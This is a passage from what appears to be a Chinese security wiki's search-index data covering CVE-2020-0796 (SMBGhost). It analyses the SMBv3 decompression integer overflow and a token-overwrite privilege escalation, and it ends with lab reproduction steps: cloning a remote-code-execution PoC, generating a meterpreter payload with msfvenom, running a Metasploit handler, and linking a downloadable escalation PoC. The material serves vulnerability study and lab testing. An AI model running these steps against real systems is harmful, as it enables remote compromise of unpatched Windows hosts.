Status \\ lt ; 0 \\ | \\ | FinalCompressedSize != gt ; Header - \\ gt ; OriginalCompressedSegmentSize ) { SrvNetFreeBuffer ( Alloc ); gt ; return STATUS_BAD_DATA ; gt ; } gt ; if ( Header - \\ gt ; Offset \\ gt ; 0 ) { memcpy ( gt ; Alloc - \\ gt ; UserBuffer , gt ; ( PUCHAR ) Header + sizeof ( COMPRESSION_TRANSFORM_HEADER ), gt ; Header - \\ gt ; Offset ); gt ; } gt ; Srv2ReplaceReceiveBuffer ( some_session_handle , Alloc ); return STATUS_SUCCESS ; } \u8be5Srv2DecompressData\u51fd\u6570\u63a5\u6536\u5ba2\u6237\u7aef\u53d1\u9001\u7684\u538b\u7f29\u6d88\u606f\uff0c\u5206\u914d\u6240\u9700\u7684\u5185\u5b58\u91cf\uff0c\u5e76\u89e3\u538b\u7f29\u6570\u636e\u3002\u7136\u540e\uff0c\u5982\u679cOffset\u5b57\u6bb5\u4e0d\u4e3a\u96f6\uff0c\u5b83\u4f1a\u5c06\u653e\u7f6e\u5728\u538b\u7f29\u6570\u636e\u4e4b\u524d\u7684\u6570\u636e\u590d\u5236\u5230\u5206\u914d\u7684\u7f13\u51b2\u533a\u7684\u5f00\u5934\u3002 \u5982\u679c\u4ed4\u7ec6\u89c2\u5bdf\uff0c\u6211\u4eec\u4f1a\u53d1\u73b0\u7b2c20\u884c\u548c\u7b2c31\u884c\u53ef\u80fd\u5bfc\u81f4\u67d0\u4e9b\u8f93\u5165\u7684\u6574\u6570\u6ea2\u51fa\u3002\u4f8b\u5982\uff0c\u5927\u591a\u6570\u5728bug\u53d1\u5e03\u540e\u4e0d\u4e45\u51fa\u73b0\u5e76\u5bfc\u81f4\u7cfb\u7edf\u5d29\u6e83\u7684poc\u90fd\u4f7f\u75280xffffff\u503c\u4f5c\u4e3aOffset\u5b57\u6bb5\u3002\u4f7f\u7528\u8be5\u503c0xffffff\u4f1a\u5728\u7b2c20\u884c\u89e6\u53d1\u6574 \u6570\u6ea2\u51fa\uff0c\u56e0\u6b64\u5206\u914d\u7684\u5b57\u8282\u66f4\u5c11\u3002 \u7a0d\u540e\uff0c\u5b83\u4f1a\u5728\u7b2c31\u884c\u89e6\u53d1\u989d\u5916\u7684\u6574\u6570\u6ea2\u51fa\u3002\u5d29\u6e83\u662f\u7531\u4e8e\u5728\u7b2c30\u884c\u4e2d\u8ba1\u7b97\u51fa\u7684\u8fdc\u79bb\u63a5\u6536\u6d88\u606f\u7684\u5730\u5740\u5904\u7684\u5185\u5b58\u8bbf\u95ee\u9020\u6210\u7684\u3002\u5982\u679c\u4ee3\u7801\u5728\u7b2c31\u884c\u9a8c\u8bc1\u4e86\u8ba1\u7b97\u7ed3\u679c\uff0c\u90a3\u4e48\u5b83\u5c06\u5f88\u65e9\u9000\u51fa\uff0c\u56e0\u4e3a\u7f13\u51b2\u533a\u957f\u5ea6\u6070\u597d \u662f\u8d1f\u6570\u4e14\u65e0\u6cd5\u8868\u793a\uff0c\u8fd9\u4e5f\u4f7f\u5f97\u7b2c30\u884c\u7684\u5730\u5740\u672c\u8eab\u4e5f\u65e0\u6548\u3002","title":"2\u3001\u521d\u6b65\u5206\u6790"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE\u00ad-2020\u00ad-0796\uff09 Windows \u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/#3","text":"\u53ea\u6709\u4e24\u4e2a\u76f8\u5173\u5b57\u6bb5\u53ef\u4ee5\u63a7\u5236\u4ee5\u5bfc\u81f4\u6574\u6570\u6ea2\u51fa\u7684\u5b57\u6bb5\uff1aOriginalCompressedSegmentSize\u548cOffset\uff0c\u56e0 \u6b64\u6ca1\u6709\u592a\u591a\u9009\u62e9\u3002\u5728\u5c1d\u8bd5\u4e86\u51e0\u79cd\u7ec4\u5408\u4e4b\u540e\uff0c\u4e0b\u9762\u7684\u7ec4\u5408\u5438\u5f15\u4e86\u6211\u4eec\uff1a\u5982\u679c\u6211\u4eec\u53d1\u9001\u4e00\u4e2a\u5408\u6cd5\u7684\u504f\u79fb\u503c\u548c\u4e00\u4e2a\u5de8\u5927\u7684\u539f\u59cb\u538b\u7f29\u6bb5\u5927\u5c0f\u503c\u5462\uff1f\u8ba9\u6211\u4eec\u56de\u987e\u4e00\u4e0b\u4ee3\u7801\u5c06\u8981\u6267\u884c\u7684\u4e09\u4e2a\u6b65\u9aa4\uff1a \u5206\u914d\uff1a\u7531\u4e8e\u6574\u6570\u6ea2\u51fa\uff0c\u5206\u914d\u7684\u5b57\u8282\u6570\u5c06\u5c0f\u4e8e\u4e24\u4e2a\u5b57\u6bb5\u7684\u603b\u548c\u3002 \u89e3\u538b\u7f29\uff1a\u89e3\u538b\u7f29\u5c06\u6536\u5230\u4e00\u4e2a\u975e\u5e38\u5927\u7684OriginalCompressedSegmentSize\u503c\uff0c\u5c06\u76ee\u6807\u7f13\u51b2\u533a\u89c6\u4e3a\u5177\u6709\u65e0\u9650\u5927\u5c0f\u3002\u6240\u6709\u5176\u4ed6\u53c2\u6570\u5747\u4e0d\u53d7\u5f71\u54cd\uff0c\u56e0\u6b64\u5b83\u5c06\u6309\u9884\u671f\u6267\u884c\u3002 \u590d\u5236\uff1a\u5982\u679c\u8981\u6267\u884c\uff0c\u5219\u590d\u5236\u5c06\u6309\u9884\u671f\u6267\u884c\u3002 \u4e0d\u7ba1\u662f\u5426\u8981\u6267\u884c\u590d\u5236\u6b65\u9aa4\uff0c\u5b83\u770b\u8d77\u6765\u5df2\u7ecf\u5f88\u6709\u8da3\u4e86------\u6211\u4eec\u53ef\u4ee5\u5728\u89e3\u538b\u7f29\u9636\u6bb5\u89e6\u53d1\u8d8a\u754c\u5199\u5165\uff0c\u56e0\u4e3a\u6211\u4eec\u8bbe\u6cd5\u5206\u914d\u4e86\u6bd4\"\u5206\u914d\"\u9636\u6bb5\u6240\u9700\u7684\u5b57\u8282\u5c11\u7684\u5b57\u8282\u3002 \u5982\u60a8\u6240\u89c1\uff0c\u4f7f\u7528\u8fd9\u79cd\u6280\u672f\uff0c\u6211\u4eec\u53ef\u4ee5\u89e6\u53d1\u4efb\u4f55\u5927\u5c0f\u548c\u5185\u5bb9\u7684\u6ea2\u51fa\uff0c\u8fd9\u662f\u4e00\u4e2a\u5f88\u597d\u7684\u5f00\u59cb\u3002\u4f46\u662f\u4ec0\u4e48\u4f4d\u4e8e\u6211\u4eec\u7684\u7f13\u51b2\u533a\u4e4b\u5916\uff1f\u8ba9\u6211\u4eec\u627e\u51fa\u7b54\u6848\uff01","title":"3\u3001\u9009\u62e9\u6ea2\u51fa\u5185\u5bb9"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE\u00ad-2020\u00ad-0796\uff09 Windows \u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/#4srvnetallocatebuffer","text":"\u4e3a\u4e86\u56de\u7b54\u8fd9\u4e2a\u95ee\u9898\uff0c\u6211\u4eec\u9700\u8981\u67e5\u770b\u5206\u914d\u51fd\u6570\uff0c\u5728\u6211\u4eec\u7684\u4f8b\u5b50\u4e2d\u662fSrvNetAllocateBuffer\u3002\u4e0b\u9762\u662f\u51fd\u6570\u7684\u6709\u8da3\u90e8\u5206\uff1a PALLOCATION_HEADER SrvNetAllocateBuffer ( SIZE_T AllocSize , PALLOCATION_HEADER SourceBuffer ) { gt ; // ... gt ; if ( SrvDisableNetBufferLookAsideList \\ | \\ | AllocSize \\ gt ; 0x100100 ) { if gt ; ( AllocSize \\ gt ; 0x1000100 ) { gt ; return NULL ; gt ; } gt ; Result = SrvNetAllocateBufferFromPool ( AllocSize , AllocSize ); gt ; } else { gt ; int LookasideListIndex = 0 ; if ( AllocSize \\ gt ; 0x1100 ) { gt ; LookasideListIndex = / \\ * some calculation based on AllocSize \\ */ ; gt ; } gt ; SOME_STRUCT list = SrvNetBufferLookasides [ LookasideListIndex ] ; Result = / \\ * gt ; fetch result from list \\ */ ; gt ; } gt ; // Initialize some Result fields ... gt ; return Result ; } \u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5206\u914d\u51fd\u6570\u6839\u636e\u6240\u9700\u7684\u5b57\u8282\u6570\u6267\u884c\u4e0d\u540c\u7684\u64cd\u4f5c\u3002\u5927\u578b\u5206\u914d\uff08\u5927\u4e8e\u7ea616MB\uff09\u4f1a\u5bfc\u81f4\u6267\u884c\u5931\u8d25\u3002\u4e2d\u578b\u5206\u914d\uff08\u5927\u4e8e\u7ea61\\ MB\uff09\u4f7f\u7528SrvNetAllocateBufferFromPool\u51fd\u6570\u8fdb\u884c\u5206\u914d\u3002\u5c0f\u578b\u5206\u914d\uff08\u5176\u4f59\\ \u7684\uff09\u4f7f\u7528lookaside\u5217\u8868\u8fdb\u884c\u4f18\u5316\u3002 \u6ce8\u610f\uff1a\u8fd8\u6709\u4e00\u4e2aSrvDisableNetBufferLookAsideList\u6807\u5fd7\u4f1a\u5f71\u54cd\u51fd\u6570\u7684\u529f\u80fd\uff0c\u4f46\u662f\u5b83\u662f\u7531\u4e00\u4e2a\u672a\u8bb0\u5f55\u7684\u6ce8\u518c\u8868\u8bbe\u7f6e\u6765\u8bbe\u7f6e\u7684\uff0c\u5e76\u4e14\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u5904\u4e8e\u7981\u7528\u72b6\u6001\uff0c\u56e0\u6b64\u5e76\u4e0d\u662f\u5f88\u6709\u8da3\u3002 Lookaside\u5217\u8868\u7528\u4e8e\u6709\u6548\u5730\u4e3a\u9a71\u52a8\u7a0b\u5e8f\u4fdd\u7559\u4e00\u7ec4\u53ef\u91cd\u7528\u7684\u3001\u56fa\u5b9a\u5927\u5c0f\u7684\u7f13\u51b2\u533a\u3002lookaside\u5217\u8868\u7684\u529f\u80fd\u4e4b\u4e00\u662f\u5b9a\u4e49\u4e00\u4e2a\u81ea\u5b9a\u4e49\u7684\u5206\u914d/\u91ca\u653e\u51fd\u6570\uff0c\u7528\u4e8e\u7ba1\u7406\u7f13\u51b2\u533a\u3002\u67e5\u770bSrvNetBufferLookasides\u6570\u7ec4\u7684\u5f15\\ \u7528\uff0c\u6211\u4eec\u53d1\u73b0\u5b83\u662f\u5728SrvNetCreateBufferLookasides\u51fd\u6570\u4e2d\u521d\u59cb\u5316\u7684\uff0c\u901a\u8fc7\u67e5\u770b\u5b83\uff0c\u6211\u4eec\u4e86\u89e3\u5230\u4ee5\u4e0b\u5185\u5bb9\uff1a \u81ea\u5b9a\u4e49\u5206\u914d\u51fd\u6570\u5b9a\u4e49\u4e3aSrvNetBufferLookasideAllocate\uff0c\u5b83\u53ea\u8c03\u7528 SrvNetAllocateBufferFromPool 9\u4e2alookaside\u5217\u8868\u6309\u4ee5\u4e0b\u5927\u5c0f\u521b\u5efa\uff0c\u6211\u4eec\u4f7f\u7528Python\u5feb\u901f\u8ba1\u7b97\uff1a >>> [hex((1 \\ \\ (i + 12)) + 256) for i in range(9)] '0x1100', '0x2100', '0x4100', '0x8100', '0x10100', '0x20100', '0x40100',\\ '0x80100', '0x100100' '0x1100', '0x2100', '0x4100', '0x8100', '0x10100', '0x20100', '0x40100',\\ '0x80100', '0x100100' \u8fd9\u4e0e\u6211\u4eec\u7684\u53d1\u73b0\u76f8\u5339\u914d\uff0c\u5373\u5206\u914d\u5927\u4e8e0x100100\u5b57\u8282\u7684\u5206\u914d\u65f6\u4e0d\u4f7f\u7528lookaside\u5217\u8868\u3002 \u7ed3\u8bba\u662f\u6bcf\u4e2a\u5206\u914d\u8bf7\u6c42\u6700\u7ec8\u90fd\u51fa\u73b0\u5728SrvNetAllocateBufferFromPool\u51fd\u6570\u4e2d\uff0c\u6240\u4ee5\u8ba9\u6211\u4eec\u6765\u5206\u6790\u5b83\u3002","title":"4\u3001\u6df1\u5165\u5206\u6790SrvNetAllocateBuffer"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE\u00ad-2020\u00ad-0796\uff09 Windows \u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/#5srvnetallocatebufferfrompool","text":"SrvNetAllocateBufferFromPool\u51fd\u6570\u4f7f\u7528ExAllocatePoolWithTag\u51fd\u6570\u5728NonPagedPoolNx\u6c60\u4e2d\u5206\u914d\u4e00\u4e2a\u7f13\u51b2\u533a\uff0c\u7136\u540e\u7528\u6570\u636e\u586b\u5145\u4e00\u4e9b\u7ed3\u6784\u3002\u5206\u914d\u7684\u7f13\u51b2\u533a\u7684\u5e03\u5c40\u5982\u4e0b\uff1a \u5728\u6211\u4eec\u7684\u7814\u7a76\u8303\u56f4\u5185\uff0c\u6b64\u5e03\u5c40\u7684\u552f\u4e00\u76f8\u5173\u90e8\u5206\u662f\u7528\u6237\u7f13\u51b2\u533a\u548c\u5206\u914d\u5934\u7ed3\u6784\u3002\u6211\u4eec\u53ef\u4ee5\u9a6c\u4e0a\u770b\u5230\uff0c\u901a\u8fc7\u6ea2\u51fa\u7528\u6237\u7f13\u51b2\u533a\uff0c\u6211\u4eec\u6700\u7ec8\u4f1a\u91cd\u5199ALLOCATION_HEADER\u7ed3\u6784\u3002\u770b\u8d77\u6765\u5f88\u65b9\u4fbf\u3002","title":"5\u3001SrvNetAllocateBufferFromPool\u548c\u5206\u914d\u7684\u7f13\u51b2\u533a\u5e03\u5c40"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE\u00ad-2020\u00ad-0796\uff09 Windows \u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/#6","text":"\u6b64\u65f6\uff0c\u6211\u4eec\u7684\u7b2c\u4e00\u4e2a\u60f3\u6cd5\u662f\uff0c\u7531SmbCompressionDecompress\u8c03\u7528\u4e4b\u540e\u7684\u68c0\u67e5\uff1a gt ; if ( Status \\ lt ; 0 \\ | \\ | FinalCompressedSize != gt ; Header - \\ gt ; OriginalCompressedSegmentSize ) { SrvNetFreeBuffer ( Alloc ); gt ; return STATUS_BAD_DATA ; } SrvNetFreeBuffer\u5c06\u88ab\u8c03\u7528\uff0c\u5e76\u4e14\u8be5\u51fd\u6570\u5c06\u5931\u8d25\uff0c\u56e0\u4e3a\u6211\u4eec\u5c06\u5176\u8bbe\u8ba1OriginalCompressedSegmentSize\u4e3a\u4e00\u4e2a\u5f88\u5927\u7684\u6570\u5b57\uff0c\u5e76\u4e14FinalCompressedSize\u5c06\u6210\u4e3a\u4e00\u4e2a\u8f83\u5c0f\u7684\u6570\u5b57\uff0c\u4ee3\u8868\u5b9e\u9645\u7684\u89e3\u538b\u7f29\u5b57\u8282\u6570\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u5206\u6790\u4e86\u8be5SrvNetFreeBuffer\u51fd\u6570\uff0c\u6210\u529f\u5730\u66ff\u6362\u4e86\u4e00\u4e2a\u5e7b\u6570\u7684\u5206\u914d\u6307\u9488\uff0c\u7136\u540e\u7b49\u5f85free\u51fd\u6570\u5c1d\u8bd5\u5bf9\u5176\u8fdb\u884c\u91ca\u653e\uff0c\u4ee5\u671f\u7a0d\u540e\u5c06\u5176\u7528\u4e8efree\u00adafter\u00adfree\u6216\u7c7b\u4f3c\u7528\u9014\u3002\u4f46\u662f\u4ee4\u6211\u4eec\u60ca\u8bb6\u7684\u662f\uff0c\u8be5memcpy\u51fd\u6570\u5d29\u6e83\u4e86\u3002\u8fd9\u4f7f\u6211\u4eec\u611f\u5230\u9ad8\u5174\uff0c\u56e0\u4e3a\u6211\u4eec\u6839\u672c\u6ca1\u6709\u60f3\u5230\u54ea\u91cc\uff0c\u4f46\u6211\u4eec\u5fc5\u987b\u68c0\u67e5\u4e3a\u4ec0\u4e48\u4f1a\u8fd9\u6837\u3002\u53ef\u4ee5\u5728SmbCompressionDecompress\u51fd\u6570\u7684\u5b9e\u73b0\u4e2d\u627e\u5230\u8bf4\u660e\uff1a gt ; NTSTATUS SmbCompressionDecompress ( USHORT CompressionAlgorithm , PUCHAR gt ; UncompressedBuffer , ULONG UncompressedBufferSize , PUCHAR CompressedBuffer , gt ; ULONG CompressedBufferSize , PULONG FinalCompressedSize ) { gt ; // ... gt ; NTSTATUS Status = RtlDecompressBufferEx2 ( gt ; ..., gt ; FinalUncompressedSize , gt ; ...); gt ; if ( Status \\ gt ; = 0 ) { gt ; \\ * FinalCompressedSize = CompressedBufferSize ; gt ; } gt ; // ... gt ; return Status ; } \u57fa\u672c\u4e0a\uff0c\u5982\u679c\u89e3\u538b\u6210\u529f\uff0cFinalCompressedSize\u5c06\u66f4\u65b0\u4e3a\u4fdd\u5b58CompressedBufferSize\u7684\u503c\uff0c\u5b83\u662f\u7f13 \u51b2\u533a\u7684\u5927\u5c0f\u3002\u8fd9\u79cd\u5bf9FinalCompressedSize\u8fd4\u56de\u503c\u7684\u6545\u610f\u66f4\u65b0\u5bf9\u6211\u4eec\u6765\u8bf4\u4f3c\u4e4e\u975e\u5e38\u53ef\u7591\uff0c\u56e0\u4e3a\u8fd9\u4e2a\u5c0f\u7ec6\u8282\uff0c\u52a0\u4e0a\u5206\u914d\u7684\u7f13\u51b2\u533a\u5e03\u5c40\uff0c\u5141\u8bb8\u975e\u5e38\u65b9\u4fbf\u5730\u5229\u7528\u8fd9\u4e2abug\u3002 \u7531\u4e8e\u6267\u884c\u7ee7\u7eed\u5230\u590d\u5236\u539f\u59cb\u6570\u636e\u7684\u9636\u6bb5\uff0c\u8ba9\u6211\u4eec\u518d\u6b21\u68c0\u67e5\u8c03\u7528\uff1a memcpy \uff08 gt ; Alloc - \\ gt ; UserBuffer \uff0c gt ; \uff08 PUCHAR \uff09\u6807\u9898 + sizeof \uff08 COMPRESSION_TRANSFORM_HEADER \uff09\uff0c Header - \\ gt ; Offset \uff09 ; \u4eceALLOCATION_HEADER\u7ed3\u6784\u4e2d\u8bfb\u53d6\u76ee\u6807\u5730\u5740\uff0c\u6211\u4eec\u53ef\u4ee5\u8986\u76d6\u8be5\u7ed3\u6784\u3002\u7f13\u51b2\u533a\u7684\u5185\u5bb9\u548c\u5927\u5c0f\u4e5f\u7531\u6211\u4eec\u63a7\u5236\u3002","title":"6\u3001\u91cd\u5199\u5206\u914d\u5934\u7ed3\u6784"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE\u00ad-2020\u00ad-0796\uff09 Windows \u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/#7","text":"\u65e2\u7136\u6211\u4eec\u6709\u4e86\u5199\u5728\u54ea\u91cc\u5f00\u53d1\uff0c\u6211\u4eec\u80fd\u7528\u5b83\u505a\u4ec0\u4e48\uff1f\u5f88\u660e\u663e\u6211\u4eec\u53ef\u4ee5\u8ba9\u7cfb\u7edf\u5d29\u6e83\u3002\u6211\u4eec\u53ef\u80fd\u80fd\u591f\u89e6\u53d1\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff0c\u4f46\u6211\u4eec\u8fd8\u6ca1\u6709\u627e\u5230\u8fd9\u6837\u505a\u7684\u65b9\u6cd5\u3002\u5982\u679c\u6211\u4eec\u5728\u672c\u5730\u4e3b\u673a\u4e0a\u4f7f\u7528\u6b64\u6f0f\u6d1e\u5e76\u6cc4\u6f0f\u5176\u4ed6\u4fe1\u606f\uff0c \u6211\u4eec\u53ef\u4ee5\u5c06\u5176\u7528\u4e8e\u672c\u5730\u6743\u9650\u63d0\u5347\uff0c\u56e0\u4e3a\u5df2\u7ecf\u901a\u8fc7\u51e0\u79cd\u6280\u672f\u8bc1\u660e\u4e86\u8fd9\u4e00\u70b9 \u6211\u4eec\u5c1d\u8bd5\u7684\u7b2c\u4e00\u79cd\u6280\u672f\u662fMorten Schenk\u5728\u5176\u300a Black Hat USA 2017\u300b\u6f14\u8bb2\u4e2d\u63d0\u51fa\u7684 \u3002\u8be5\u6280\u672f\u6d89\u53ca\u91cd\u5199win32\u7684.data\u90e8\u5206\u4e2d\u7684\u51fd\u6570\u6307\u9488\u6570\u636e\u5e93\u7cfb\u7edf\u9a71\u52a8\u7a0b\u5e8f\uff0c\u7136\u540e\u4ece\u7528\u6237\u6a21\u5f0f\u8c03\u7528\u76f8\u5e94\u7684\u51fd\u6570\u4ee5\u83b7\u5f97\u4ee3\u7801\u6267\u884c\u3002j00ru\u5199\u4e86\u4e00\u7bc7\u5173\u4e8e\u5728WCTF 2018\u4e2d\u4f7f\u7528\u6b64\u6280\u672f\u7684\u7cbe\u5f69\u6587\u7ae0\uff0c\u5e76\u63d0\u4f9b\u4e86\u4ed6\u7684\u6f0f\u6d1e\u6e90\u4ee3\u7801\u3002\u6211\u4eec\u9488\u5bf9write what where\u6f0f\u6d1e\u8fdb\u884c\u4e86\u8c03\u6574\uff0c\u4f46\u53d1\u73b0\u5b83\u4e0d\u8d77\u4f5c\u7528\uff0c\u56e0\u4e3a\u5904\u7406SMB\u6d88\u606f\u7684\u7ebf\u7a0b\u4e0d\u662fGUI\u7ebf \u7a0b\u3002\u56e0\u6b64\uff0cwin32\u6570\u636e\u5e93\u7cfb\u7edf\u6ca1\u6709\u6620\u5c04\uff0c\u800c\u4e14\u6280\u672f\u4e5f\u4e0d\u76f8\u5173\uff08\u9664\u975e\u6709\u529e\u6cd5\u4f7f\u5b83\u6210\u4e3a\u4e00\u4e2aGUI\u7ebf\u7a0b\uff0c\u8fd9\u662f\u6211\u4eec\u6ca1\u6709\u7814\u7a76\u8fc7\u7684\uff09\u3002 \u6211\u4eec\u6700\u7ec8\u57282012\u5e74\u7684\u9ed1\u5e3d\u6f14\u793a\u4e2d\u4f7f\u7528\u4e86cesarcer\u6240\u4ecb\u7ecd\u7684\u8457\u540d\u6280\u672f---\u8f7b\u677e\u672c\u5730Windows\u5185\u6838\u5f00\u53d1\u3002 \u8be5\u6280\u672f\u662f\u901a\u8fc7\u4f7f\u7528NtQuerySystemInformation\uff08SystemHandleInformation\uff09API\u6cc4\u6f0f\u5f53\u524d\u8fdb\u7a0b\u4ee4\u724c \u5730\u5740\uff0c\u7136\u540e\u91cd\u5199\u8be5\u5730\u5740\uff0c\u6388\u4e88\u5f53\u524d\u8fdb\u7a0b\u4ee4\u724c\u6743\u9650\uff0c\u8fd9\u4e9b\u6743\u9650\u53ef\u7528\u4e8e\u6743\u9650\u63d0\u5347\u3002Bryan Alexander\uff08dronesec\uff09\u548cStephen Breen\uff08breenmachine\uff09\uff082017\uff09\u5728EoP\u7814\u7a76\u4e2d\u6ee5\u7528\u4ee3\u7406\u6743\u9650\uff0c \u5c55\u793a\u4e86\u4f7f\u7528\u5404\u79cd\u4ee4\u724c\u7279\u6743\u63d0\u5347\u7279\u6743\u7684\u51e0\u79cd\u65b9\u6cd5\u3002 \u6211\u4eec\u57fa\u4e8eAlexandre Beaulieu\u5728\u5229\u7528\u4efb\u610f\u5199\u64cd\u4f5c\u63d0\u5347\u6743\u9650writeup\u65f6\u5171\u4eab\u7684\u4ee3\u7801\u8fdb\u884c\u653b\u51fb\u3002\u5728\u4fee\u6539\u8fdb\u7a0b\u7684\u4ee4\u724c\u7279\u6743\u540e\uff0c\u6211\u4eec\u901a\u8fc7\u5c06DLL\u6ce8\u5165winlogon.exe. DLL\u7684\u5168\u90e8\u76ee\u7684\u662f\u542f\u52a8\u547d\u4ee4\u63d0\u793a\u7b26. \u6211\u4eec\u7684\u5b8c\u6574\u672c\u5730\u7279\u6743\u5347\u7ea7\u8bc1\u660e\u53ef\u5728*\u6b64\u5904*\u627e\u5230\uff0c\u4ec5\u53ef\u7528\u4e8e\u7814\u7a76/\u9632\u5fa1\u76ee\u7684\u3002","title":"7\u3001\u672c\u5730\u6743\u9650\u63d0\u5347"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE\u00ad-2020\u00ad-0796\uff09 Windows \u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/#cve20200796-rce","text":"","title":"\u56db\u3001CVE\u00ad2020\u00ad0796 RCE\u6f0f\u6d1e\u590d\u73b0"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE\u00ad-2020\u00ad-0796\uff09 Windows \u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/#_5","text":"\u653b\u51fb\u673a\uff1akal2019 ip:192.168.1.101 \u76ee\u6807\u9776\u673a\uff1awindows10 1903 x64 (\u4e13\u4e1a\u7248\uff0c\u4f01\u4e1a\u7248\u4e5f\u53ef\u4ee5\uff09 ip:192.168.1.103 \u76ee \u6807 \u9776 \u673a \u7684 \u4e0b \u8f7d \u5730 \u5740 \uff1a ed2k://|file|cn_windows_10_business_editions_version_1903_x64_dvd_e001dd2c.iso|4815527936| 47D4C57E638DF8BF74C59261E2CE702D|/ \u73af\u5883\u8981\u6c42\uff1a \u8be5poc\u4e0d\u592a\u7a33\u5b9a\uff0c\u9700\u8981\u591a\u6b21\u6d4b\u8bd5(\u731c\u6d4b\u662f\u5360\u7528\u76d1\u542c\u7aef\u53e3\u6216\u8005\u7f51\u7edc\u95ee\u9898\uff09\uff0c\u6709\u53ef\u80fd\u51fa\u73b0\u84dd\u5c4f\u73b0\u8c61(2).\u5982\u679cPOC\u5931\u8d25\uff0c\u53ef\u80fd\u662f\u76ee\u6807\u7cfb\u7edf\u5f00\u542f\u7cfb\u7edf\u81ea\u5e26\u7684defender\u62e6\u622a\u4e86\u3002 \u590d\u73b0\u6b65\u9aa4 kali\u4e0b\u514b\u9686\u4e0b\u8f7d\u5229\u7528poc root\\@kali2019:/opt\\# git clone* https://github.com/ianxtianxt/SMBGhost_RCE_PoC.git \u5207\u6362\u5230\u5229\u7528poc\u76ee\u5f55\u4e0b root\\@kali2019:/opt\\# cd SMBGhost_RCE_PoC/ \u8be5POC\u9700\u8981\u7528python3\u73af\u5883\u6267\u884c \u53ef\u4ee5\u770b\u5230\u76ee\u6807\u9776\u673a\u7684IP\u5730\u5740\u4ee5\u53ca\u7cfb\u7edf\u7248\u672c \u5728kali\u4e0b\u751f\u6210python\u7248\u672c\u7684\u53cd\u5f39shellcode root\\@kali2019:\\~\\# msfvenom ``\u00ad``p windows/x64/meterpreter/bind_tcp lport=2333 ``\u00ad``f py ``\u00ad``o exp.py \u53ef\u4ee5\u770b\u5230\u751f\u6210\u7684shellcode root\\@kali2019:~# cat exp.py \u5c06\u751f\u6210\u7684exp.py\u4ee3\u7801\u4e2d\u7684\u53d8\u91cfbuf\u5168\u90e8\u66ff\u6362\u6210\u53d8\u91cfUSER_PAYLOAD\uff0c\u7136\u540e\u5c06\u6240\u6709\u4ee3\u7801\u7c98\u8d34\u8986\u76d6\u4e0b\u9762\u7684\u4ee3\u7801\u5904\uff1a \u5728kali\u4e0a\u542f\u52a8MSF\uff0c\u5e76\u5982\u4e0b\u8bbe\u7f6e msf5 \\ use exploit/multi/handler msf5 exploit(multi/handler) \\ set payload windows/x64/meterpreter/bind_tcp \\ #\u8bbe\u7f6e\u53cd\u5f39\u6a21\u5f0fmsf5 exploit(multi/handler) > set rhost 192.168.1.103\\ #\u8bbe\u7f6e\u76ee\u6807\u9776\u673aIP\u5730\u5740 msf5 exploit(multi/handler) \\ set lport 2333 \\#\u8bbe\u7f6e\u76d1\u542c\u7aef\u53e3msf5 \\ exploit(multi/handler) \\ exploit \u6267\u884c\u5229\u7528poc\uff0c\u53ef\u4ee5\u770b\u5230\u6210\u529f\u6267\u884c\uff0c\u5728\u6309\u4efb\u610f\u952e\uff0c\u6700\u597d\u56de\u8f66\u952e\u5373\u53ef python3 exploit.py ``\u00ad``ip 192.168.1.103 \u5728msf\u53ef\u4ee5\u770b\u5230\u6210\u529f\u53cd\u5f39\u51fa\u76ee\u6807\u9776\u673a\u7684shell","title":"\u73af\u5883\u51c6\u5907"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE\u00ad-2020\u00ad-0796\uff09 Windows \u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/#cve20200796","text":"\u73af\u5883\u8981\u6c42\uff0c\u9700\u8981windows 10 1909 x64 \u4e0b \u8f7d \u5730 \u5740 \uff1a\\ ed2k://|file|cn_windows_10_business_editions_version_1909_x64_dvd_0ca83907.iso|5275090944|\\ 9BCD5FA6C8009E4D0260E4B23008BD47|/ \u63d0\u6743POC: https://download.0-sec.org/\u7cfb\u7edf\u5b89\u5168/Windows/CVE-2020-0796\u63d0\u6743poc.zip \u8fd9\u91cc\u6211\u65b0\u5efa\u4e86\u4e00\u4e2a\u666e\u901a\u6743\u9650\u7684\u8d26\u53f7\uff0c\u53ef\u4ee5\u770b\u5230\u6743\u9650\u5f88\u5c0f \u5728\u666e\u901a\u8d26\u53f7\u4e0a\u6267\u884ccve\u00ad2020\u00ad0796\u00adlocal.exe\uff0c\u53ef\u4ee5\u770b\u5230\u6210\u529f\u63d0\u6743\u5230system\u6743\u9650","title":"\u4e94\u3001CVE\u00ad2020\u00ad0796 \u672c\u5730\u63d0\u6743\u6f0f\u6d1e\u590d\u73b0"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE\u00ad-2020\u00ad-0796\uff09 Windows 